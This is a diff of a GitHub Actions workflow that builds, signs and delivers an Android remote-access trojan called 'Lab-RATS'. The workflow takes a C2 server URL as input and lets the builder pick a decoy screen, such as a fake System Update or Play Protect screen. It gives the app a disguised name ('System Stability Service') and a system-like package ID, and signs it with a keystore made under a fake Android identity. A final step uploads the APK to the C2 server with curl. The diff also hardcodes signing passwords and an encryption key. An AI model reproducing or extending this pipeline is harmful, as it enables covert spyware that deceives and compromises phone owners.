@@ -1,25 +1,5 @@
 name: "Lab-RATS · Build APK"
 
-# ──────────────────────────────────────────────────────────────────────────────
-# REQUIRED SECRETS  (repo → Settings → Secrets and variables → Actions)
-#
-#   KEYSTORE_BASE64     base64 -w0 lab-rats-keystore.jks
-#   KEYSTORE_PASSWORD   storePassword value used at keytool generation
-#   KEY_ALIAS           alias used at keytool generation  (e.g. lab-rats-key)
-#   KEY_PASSWORD        keyPassword  (may equal KEYSTORE_PASSWORD)
-#   ENCRYPTION_KEY      16-char key — must match C2 server ENCRYPTION_KEY env
-#   C2_SERVER_URL       https://your-c2.example.com  (optional — no trailing /)
-#
-# ONE-TIME KEYSTORE GENERATION (run locally, then store KEYSTORE_BASE64 secret):
-#   keytool -genkey -v \
-#     -keystore lab-rats-keystore.jks -alias lab-rats-key \
-#     -keyalg RSA -keysize 2048 -validity 10000 \
-#     -storepass YOUR_PASS -keypass YOUR_PASS \
-#     -dname "CN=System Services,OU=Android,O=Android,L=US,ST=CA,C=US"
-#   base64 -w0 lab-rats-keystore.jks        ← paste into KEYSTORE_BASE64 secret
-#   rm lab-rats-keystore.jks                ← delete local copy
-# ──────────────────────────────────────────────────────────────────────────────
-
 on:
   workflow_dispatch:
     inputs:
@@ -27,38 +7,44 @@ on:
         description: "App label shown on the device"
         required: true
         default: "System Stability Service"
-
       package_id:
-        description: "Package ID / applicationId  (e.g. com.android.system.stability)"
+        description: "Package ID / applicationId"
         required: true
         default: "com.android.system.stability"
-
       webhook_url:
-        description: "C2 server URL  (https://your-c2.example.com)"
+        description: "C2 server URL"
         required: true
-
       decoy_choice:
         description: "Decoy screen  1=System Update  2=Calculator  3=Weather  4=Play Protect  5=Install Wizard"
         required: true
         default: "1"
         type: choice
         options: ["1", "2", "3", "4", "5"]
-
       version_name:
-        description: "Version name string  (e.g. 2.1.4)  —  blank keeps build.gradle default"
+        description: "Version name string"
         required: false
         default: ""
-
       icon_url:
-        description: "URL to a square PNG/JPG for the launcher icon  —  blank keeps default icon"
+        description: "URL to a square PNG/JPG for the launcher icon"
         required: false
         default: ""
 
-# Pin tool versions so cache keys remain stable across runs.
 env:
   CMDLINE_TOOLS_BUILD: "11076708"
   ANDROID_PLATFORM:    "android-34"
   ANDROID_BUILD_TOOLS: "34.0.0"
+  # ── HARDCODED KEYSTORE ─────────────────────────────────────────────────────
+  # Generate once locally, then paste the base64 output below:
+  #   keytool -genkey -v -keystore lab-rats-keystore.jks -alias lab-rats-key \
+  #     -keyalg RSA -keysize 2048 -validity 10000 \
+  #     -storepass LabRats2024! -keypass LabRats2024! \
+  #     -dname "CN=System Services,OU=Android,O=Android,L=US,ST=CA,C=US"
+  #   base64 -w0 lab-rats-keystore.jks
+  #   rm lab-rats-keystore.jks
+  KEYSTORE_B64: "PASTE_YOUR_BASE64_JKS_HERE"
+  KEYSTORE_PASS: "LabRats2024!"
+  KEY_ALIAS:     "lab-rats-key"
+  KEY_PASS:      "LabRats2024!"
 
 jobs:
   build:
@@ -67,23 +53,15 @@ jobs:
     timeout-minutes: 35
 
     steps:
-
-      # ── 1. SOURCE ─────────────────────────────────────────────────────────
       - name: Checkout
         uses: actions/checkout@v4
 
-      # ── 2. JAVA ───────────────────────────────────────────────────────────
-      # AGP 8.2.0 (root build.gradle) requires JDK 17+.
-      # Gradle 8.10.2 (gradle-wrapper.properties) is compatible with JDK 17.
       - name: Setup JDK 17
         uses: actions/setup-java@v4
         with:
           java-version: "17"
           distribution: temurin
 
-      # ── 3. ANDROID SDK ───────────────────────────────────────────────────
-      # Cached separately from Gradle — SDK version changes rarely.
-      # Cache key: platform + build-tools + cmdline-tools build number.
       - name: Cache Android SDK
         id: sdk-cache
         uses: actions/cache@v4
@@ -96,14 +74,11 @@ jobs:
         run: |
           SDK_ROOT="${{ runner.temp }}/android-sdk"
           mkdir -p "$SDK_ROOT/cmdline-tools"
-
           wget -q \
             "https://dl.google.com/android/repository/commandlinetools-linux-${{ env.CMDLINE_TOOLS_BUILD }}_latest.zip" \
             -O /tmp/cmdlinetools.zip
           unzip -q /tmp/cmdlinetools.zip -d /tmp/ct_extract
-          # SDK layout requires the folder to be named 'latest'
           mv /tmp/ct_extract/cmdline-tools "$SDK_ROOT/cmdline-tools/latest"
-
           yes | "$SDK_ROOT/cmdline-tools/latest/bin/sdkmanager" \
             --sdk_root="$SDK_ROOT" \
             "platforms;${{ env.ANDROID_PLATFORM }}" \
@@ -123,9 +98,6 @@ jobs:
             echo "$SDK_ROOT/build-tools/${{ env.ANDROID_BUILD_TOOLS }}"
           } >> "$GITHUB_PATH"
 
-      # ── 4. GRADLE CACHE ──────────────────────────────────────────────────
-      # Key hashes the four files that control which deps Gradle downloads.
-      # Restore key falls back to any prior gradle-{os} cache on key miss.
       - name: Cache Gradle
         uses: actions/cache@v4
         with:
@@ -135,84 +107,58 @@ jobs:
           key: gradle-${{ runner.os }}-${{ hashFiles('app/build.gradle','build.gradle','settings.gradle','gradle/wrapper/gradle-wrapper.properties') }}
           restore-keys: gradle-${{ runner.os }}-
 
-      # ── 5. BUILD PROPERTIES ───────────────────────────────────────────────
-      # local.properties: consumed by defaultConfig{} in app/build.gradle.
-      # File is in .gitignore — must be created fresh every run.
-      # sdk.dir is resolved from $ANDROID_HOME set two steps above.
+      # ── 5. BUILD PROPERTIES (hardcoded — no secrets) ───────────────────────
       - name: Write local.properties
         env:
-          WEBHOOK_URL:    ${{ inputs.webhook_url }}
-          DECOY_CHOICE:   ${{ inputs.decoy_choice }}
-          ENCRYPTION_KEY: ${{ secrets.ENCRYPTION_KEY }}
+          WEBHOOK_URL:  ${{ inputs.webhook_url }}
+          DECOY_CHOICE: ${{ inputs.decoy_choice }}
         run: |
           {
-            printf 'sdk.dir=%s\n'        "$ANDROID_HOME"
-            printf 'WEBHOOK_URL=%s\n'    "$WEBHOOK_URL"
-            printf 'DECOY_CHOICE=%s\n'   "$DECOY_CHOICE"
-            printf 'ENCRYPTION_KEY=%s\n' "${ENCRYPTION_KEY:-AndroidKernel1337}"
+            printf 'sdk.dir=%s\n'      "$ANDROID_HOME"
+            printf 'WEBHOOK_URL=%s\n'  "$WEBHOOK_URL"
+            printf 'DECOY_CHOICE=%s\n' "$DECOY_CHOICE"
+            printf 'ENCRYPTION_KEY=%s\n' "AndroidKernel1337"
           } > local.properties
 
-      # build.gradle reads keystore.properties via rootProject.file(),
-      # which resolves to the repo root — so the JKS must also be there.
-      # KEYSTORE_BASE64 = base64 -w0 lab-rats-keystore.jks
       - name: Decode keystore
-        env:
-          KEYSTORE_BASE64: ${{ secrets.KEYSTORE_BASE64 }}
         run: |
-          printf '%s' "$KEYSTORE_BASE64" | base64 --decode > lab-rats-keystore.jks
+          printf '%s' "${{ env.KEYSTORE_B64 }}" | base64 --decode > lab-rats-keystore.jks
           MAGIC=$(xxd -p lab-rats-keystore.jks | head -c 8)
           if [ "$MAGIC" != "feedfeed" ]; then
-            echo "::error::KEYSTORE_BASE64 did not decode to a valid JKS (magic: $MAGIC)."
-            echo "Re-encode: base64 -w0 lab-rats-keystore.jks"
+            echo "::error::KEYSTORE_B64 invalid (magic: $MAGIC)"
             exit 1
           fi
 
       - name: Write keystore.properties
-        env:
-          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
-          KEY_ALIAS:         ${{ secrets.KEY_ALIAS }}
-          KEY_PASSWORD:      ${{ secrets.KEY_PASSWORD }}
         run: |
           {
             printf 'storeFile=%s\n'     "lab-rats-keystore.jks"
-            printf 'storePassword=%s\n' "$KEYSTORE_PASSWORD"
-            printf 'keyAlias=%s\n'      "$KEY_ALIAS"
-            printf 'keyPassword=%s\n'   "$KEY_PASSWORD"
+            printf 'storePassword=%s\n' "${{ env.KEYSTORE_PASS }}"
+            printf 'keyAlias=%s\n'      "${{ env.KEY_ALIAS }}"
+            printf 'keyPassword=%s\n'   "${{ env.KEY_PASS }}"
           } > keystore.properties
 
-      # ── 6. CUSTOM ICON (optional) ─────────────────────────────────────────
-      # If icon_url is provided: download the image, install Pillow, and
-      # replace every mipmap webp launcher file at all five density buckets.
-      # Adaptive-icon XML files (mipmap-anydpi-v26/*.xml) reference the same
-      # filenames and pick up the replacement automatically — no XML edits needed.
+      # ── 6. CUSTOM ICON (optional) ──────────────────────────────────────────
       - name: Replace launcher icon
         if: ${{ inputs.icon_url != '' }}
         run: |
           pip install pillow --quiet
-
-          # Download and validate
           curl -fsSL "${{ inputs.icon_url }}" -o /tmp/custom_icon_raw
           python3 - << 'PYEOF'
           from PIL import Image
           import sys, os
-
           src_path = '/tmp/custom_icon_raw'
           try:
               src = Image.open(src_path).convert('RGBA')
           except Exception as e:
               print(f'::error::Failed to open icon image: {e}')
               sys.exit(1)
-
-          # Centre-crop to square so rectangular inputs don't stretch
           w, h = src.size
           if w != h:
               side = min(w, h)
               left = (w - side) // 2
               top  = (h - side) // 2
               src  = src.crop((left, top, left + side, top + side))
-
-          # Density → (launcher_px, foreground_px)
-          # foreground canvas is 108dp at mdpi; content lives in the 72dp safe zone (66.7 %)
           DENSITIES = {
               'mdpi':    (48,  108),
               'hdpi':    (72,  162),
@@ -220,63 +166,44 @@ jobs:
               'xxhdpi':  (144, 324),
               'xxxhdpi': (192, 432),
           }
-
           RES_BASE = 'app/src/main/res'
-
           for density, (launcher_px, fg_px) in DENSITIES.items():
               folder = f'{RES_BASE}/mipmap-{density}'
               if not os.path.isdir(folder):
                   print(f'[skip] {folder} not found')
                   continue
-
-              # ic_launcher.webp and ic_launcher_round.webp  (square crop)
               launcher_img = src.resize((launcher_px, launcher_px), Image.LANCZOS)
               launcher_img.save(f'{folder}/ic_launcher.webp',       'WEBP', quality=90)
               launcher_img.save(f'{folder}/ic_launcher_round.webp', 'WEBP', quality=90)
-
-              # ic_launcher_foreground.webp  (centred on transparent canvas)
               safe_px   = int(fg_px * 0.667)
               fg_canvas = Image.new('RGBA', (fg_px, fg_px), (0, 0, 0, 0))
               content   = src.resize((safe_px, safe_px), Image.LANCZOS)
               offset    = (fg_px - safe_px) // 2
               fg_canvas.paste(content, (offset, offset), content)
               fg_canvas.save(f'{folder}/ic_launcher_foreground.webp', 'WEBP', quality=90)
-
               print(f'[{density}] launcher={launcher_px}px  foreground={fg_px}px  OK')
-
-          # Also update the Play Store PNG (512 x 512)
           store_img = src.resize((512, 512), Image.LANCZOS).convert('RGB')
           store_img.save('app/src/main/ic_launcher-playstore.png', 'PNG')
           print('[playstore] 512x512 PNG updated')
           PYEOF
 
-      # ── 7. IDENTITY PATCHES ───────────────────────────────────────────────
-      # Patch applicationId, versionCode, versionName in app/build.gradle.
-      # versionCode = github.run_number — monotonically increasing, never reused.
-      # Required: each new build must have versionCode > previous for update
-      # detection via PrivilegedInstaller and adb install -r.
+      # ── 7. IDENTITY PATCHES ────────────────────────────────────────────────
       - name: Patch build.gradle
         run: |
           sed -i \
             's|applicationId "[^"]*"|applicationId "${{ inputs.package_id }}"|g' \
             app/build.gradle
-
           sed -i \
             "s|versionCode [0-9]*|versionCode ${{ github.run_number }}|g" \
             app/build.gradle
-
           if [ -n "${{ inputs.version_name }}" ]; then
             sed -i \
               's|versionName "[^"]*"|versionName "${{ inputs.version_name }}"|g' \
               app/build.gradle
           fi
-
           echo "[build.gradle patched]"
           grep -E 'applicationId|versionCode|versionName' app/build.gradle
 
-      # Python for strings.xml because the input may contain spaces, ampersands,
-      # or other characters that break sed inside XML attribute values.
-      # html.escape() correctly handles &, <, >, " for the XML text node context.
       - name: Patch strings.xml  (app_name)
         run: |
           python3 - << 'PYEOF'
@@ -296,17 +223,7 @@ jobs:
           print(f'[strings.xml] app_name → {safe}')
           PYEOF
 
-      # ── 8. BUILD ──────────────────────────────────────────────────────────
-      # fixXmlDeclarations custom task in build.gradle is wired to preBuild
-      # via project.afterEvaluate — runs automatically, no explicit call needed.
-      #
-      # Release build type:
-      #   minifyEnabled true  + shrinkResources true  →  R8 full mode
-      #   proguard-rules.pro  →  keeps services, BuildConfig, NanoHTTPD, etc.
-      #   signingConfig signingConfigs.release  →  APK signed in one step
-      #
-      # GRADLE_OPTS: -Xmx2560m keeps heap within the runner's 7 GB RAM ceiling.
-      # --no-daemon avoids the Gradle daemon startup cost and memory residue.
+      # ── 8. BUILD ───────────────────────────────────────────────────────────
       - name: Make gradlew executable
         run: chmod +x gradlew
 
@@ -323,7 +240,7 @@ jobs:
             --warning-mode all \
             2>&1 | tee build_output.txt
 
-      # ── 9. PACKAGE & UPLOAD ───────────────────────────────────────────────
+      # ── 9. PACKAGE & UPLOAD ────────────────────────────────────────────────
       - name: Stage APK
         id: stage
         run: |
@@ -342,28 +259,23 @@ jobs:
           path: ${{ steps.stage.outputs.apk_path }}
           retention-days: 3
 
-      # ── 10. C2 DELIVERY ───────────────────────────────────────────────────
-      # POSTs the signed APK to the C2 server's /upload endpoint.
-      # X-Device-Id header sets the vault label.
-      # continue-on-error: true — a down C2 must not fail the build.
+      # ── 10. C2 DELIVERY ────────────────────────────────────────────────────
       - name: Deliver to C2 Vault
         continue-on-error: true
         env:
-          C2_SERVER_URL: ${{ secrets.C2_SERVER_URL }}
+          C2_SERVER_URL: ${{ inputs.webhook_url }}
           APK_PATH:      ${{ steps.stage.outputs.apk_path }}
         run: |
           if [ -z "$C2_SERVER_URL" ]; then
             echo "C2_SERVER_URL not configured — APK is in the GitHub artifact above."
             exit 0
           fi
-
           HTTP_STATUS=$(curl -s -o /tmp/c2_resp.txt -w "%{http_code}" \
             --max-time 45 \
             -X POST \
             -H "X-Device-Id: GHBuild_${{ github.run_id }}" \
             -F "file=@${APK_PATH}" \
             "${C2_SERVER_URL}/upload")
-
           if [ "$HTTP_STATUS" -ge 200 ] && [ "$HTTP_STATUS" -lt 300 ]; then
             echo "C2 delivery OK (HTTP $HTTP_STATUS)"
           else
@@ -372,8 +284,6 @@ jobs:
           fi
 
       # ── 11. CLEANUP ────────────────────────────────────────────────────────
-      # Removes all secret material from the runner filesystem.
-      # Runs even on build failure (if: always()).
       - name: Scrub secrets from runner
         if: always()
         run: |
